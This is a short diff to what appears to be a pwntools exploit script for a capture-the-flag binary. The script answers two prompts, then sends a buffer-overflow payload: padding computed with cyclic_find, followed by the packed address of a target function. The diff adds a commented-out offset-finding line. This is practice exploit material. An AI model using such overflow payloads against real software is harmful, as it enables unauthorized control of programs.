@@ -57,6 +57,7 @@ io = start()
 
 io.sendlineafter(b"?", b"Arthur, King of the Britons")
 io.sendlineafter(b"?", b"To seek the holy grail")
+# io.sendlineafter(b"?", cyclic(300))
 io.sendlineafter(b"?", cyclic_find(0x6261616362616162) * b"a" + pack(exe.sym.ez))
 
 io.interactive()
